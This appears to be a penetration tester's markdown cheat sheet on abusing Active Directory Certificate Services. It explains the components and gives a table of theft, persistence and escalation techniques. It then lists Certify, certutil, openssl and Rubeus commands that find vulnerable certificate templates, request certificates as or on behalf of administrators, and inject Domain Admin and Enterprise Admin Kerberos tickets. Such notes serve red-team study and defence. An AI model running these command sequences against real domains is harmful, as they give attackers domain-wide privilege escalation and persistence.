---
tags:
  - privesc
title:
  - AD CS
---
#### Introduction
- **Active Directory Certificate Services** (AD CS) enables use of Microsoft's own Public Key Infrastructure (PKI) in an active directory forest.
- AD CS helps in authenticating users and machines, encrypting and signing documents, filesystems, emails and more.
- A good attack vector since certificates **can** survive credential rotation, it also proves as a good persistence mechanism.
#### Elements of AD CS
- CA - The **certification authority** that issues certificates. The server with AD CS role (DC or separate) is the CA
- Certificate - Issued to a user or machine and can be used for authentication, encryption, signing etc.
- Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA. It is typically created by an Administrator.
- CSR - **Certificate Signing Request** made by a client to the CA to request a signed certificate.
- Certificate Template - Defines settings for a certificate. Contains information like enrollment permissions, EKUs, expiry etc.
- EKU OIDs - **Extended Key Usages** Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)

![[AD CS.svg]]
#### Abuse
- Extract user and machine certificates
- Use certificates to retrieve NTLM hash
- User and machine level persistence
- Escalation to Domain Admin and Enterprise Admin
- Domain Persistence

| Abuse Type            | 1                                                         | 2                                                   | 3                                                                                        | 4                                        | 5                                                                | 6                                                                         | 7                                                                                               | 8                                       |
| --------------------- | --------------------------------------------------------- | --------------------------------------------------- | ---------------------------------------------------------------------------------------- | ---------------------------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | --------------------------------------- |
| Stealing Certificates | Export certs with private keys using Windows' crypto APIs | Extracting user certs with private keys using DPAPI | Extracting machine certs with private keys using DPAPI                                   | Steal certificates from files and stores | Use Kerberos PKINIT to get NTLM hash                             |                                                                           |                                                                                                 |                                         |
| Persistence           | User persistence by requesting new certs                  | Machine persistence by requesting new certs         | User/Machine persistence by renewing certs                                               |                                          |                                                                  |                                                                           |                                                                                                 |                                         |
| Escalation            | Enrolee can request cert for ANY user                     | Any purpose or no EKU (potentially dangerous)       | Request an enrollment agent certificate and use it to request cert on behalf of ANY user | Overly permissive ACLs on templates      | Poor access control on CA server, CA server computer object etc. | EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CA - Request certs for ANY user | Poor access control on roles on CA authority like "CA Administration" and "Certificate Manager" | NTLM relay to HTTP enrollment endpoints |
| Domain Persistence    | Forge certificates with stolen CA private keys            | Malicious root/interm ediate CAs                    | Backdoor CA Server, CA server computer object etc.                                       |                                          |                                                                  |                                                                           |                                                                                                 |                                         |

```batch title:"Get all certificate templates"
certutil -v -template > templates.txt
```

```batch title:"Enumerate AD CS in the target forest"
Certify.exe cas
```

```batch title:"Enumerate the templates"
Certify.exe find
```

```batch title:"Enumerate templates where the enrollee can supply subject names"
Certify.exe find /enrolleeSuppliesSubject
```

```batch title:"Enumerate vulnerable templates"
Certify.exe find /vulnerable
```

#### Escalation to Domain Admin

```batch title:"Request a certificate for Certificate Request Agent from a template"
Certify.exe request /ca:computer-name-fqdn\ffff /template:template-name
```

```batch title:"Provide alternative subject name if ENROLLEE_SUPPLIES_SUBJECT"
Certify.exe request /ca:computer-name-fqdn\ffff /template:template-name /altname:administrator
```

```batch title:"Convert .pem to .pfx"
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```batch title:"Convert from cert.pem to pfx and use it to request a certificate on behalf of DA using that template"
Certify.exe request /ca:compute-name-fqdn\ffff /template:template-name /onbehalfof:username-fqdn /enrollcert:certificate.pfx /enrollcertpw:password
```

```batch title:"Using certificate.pfx, request DA TGT and inject it"
Rubeus.exe asktgt /user:administrator /certificate:certificate.pfx /password:password /ptt
```

#### Escalation to Enterprise Admin

```batch title:"Convert from cert.pem to pfx and use it to request a certificate on behalf of EA using a template"
Certify.exe request /ca:certificate-authority-computer-name\ffff /template:template-name /onbehalfof:forest.name\administrator /enrollcert:certificate.pfx /enrollcertpw:password
```

```batch title:"Request EA TGT and inject it"
Rubeus.exe asktgt /user:forest.name\administrator /certificate:certificate.pfx /dc:other-forest-domain-controller-fqdn /password:password /ptt
```



